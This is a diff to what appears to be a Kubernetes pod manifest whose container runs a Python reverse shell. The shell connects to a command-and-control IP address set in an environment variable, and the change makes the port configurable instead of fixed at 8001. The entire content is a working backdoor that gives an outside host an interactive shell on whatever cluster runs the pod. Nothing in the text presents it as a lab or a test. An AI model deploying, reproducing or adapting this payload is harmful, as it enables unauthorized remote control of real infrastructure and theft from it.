@@ -57,10 +57,12 @@ spec:
       env:
         - name: C2_SERVER_IP
           value: "13.112.164.157"
+        - name: C2_SERVER_PORT
+          value: "8002"
       command:
         - /bin/sh
       args:
         - -c
         - |
-          python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',8001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+          python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',${C2_SERVER_PORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
 EOF
